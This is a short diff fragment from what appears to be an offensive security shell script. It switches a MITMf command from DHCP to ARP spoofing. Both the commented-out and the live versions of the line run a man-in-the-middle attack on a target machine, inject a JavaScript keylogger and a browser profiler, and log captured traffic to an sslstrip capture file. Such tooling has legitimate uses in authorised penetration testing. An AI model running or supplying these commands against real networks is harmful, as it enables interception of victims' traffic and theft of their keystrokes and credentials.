@@ -336,8 +336,8 @@ echo "Logs saved to /captures/sslstrip/mitmf.log"
 echo ""
 echo "[*] ------------------------------------------------------"
 # Uncomment when beef-xss for MITMf is fixed #
-#python mitmf.py --spoof --dhcp --iface $mitmf_interface --gateway $mitmf_routerip --target $mitmf_targetip $mitmf_startbeef --jskeylogger --browserprofiler -w /captures/sslstrip/mitmf.log
-python mitmf.py --spoof --dhcp --iface $mitmf_interface --gateway $mitmf_routerip --target $mitmf_targetip --jskeylogger --browserprofiler -w /captures/sslstrip/mitmf.log
+#python mitmf.py --spoof --arp --iface $mitmf_interface --gateway $mitmf_routerip --target $mitmf_targetip $mitmf_startbeef --jskeylogger --browserprofiler -w /captures/sslstrip/mitmf.log
+python mitmf.py --spoof --arp --iface $mitmf_interface --gateway $mitmf_routerip --target $mitmf_targetip --jskeylogger --browserprofiler -w /captures/sslstrip/mitmf.log
 }
 ########################## REVERSE MENU ################################
 f_reverse(){
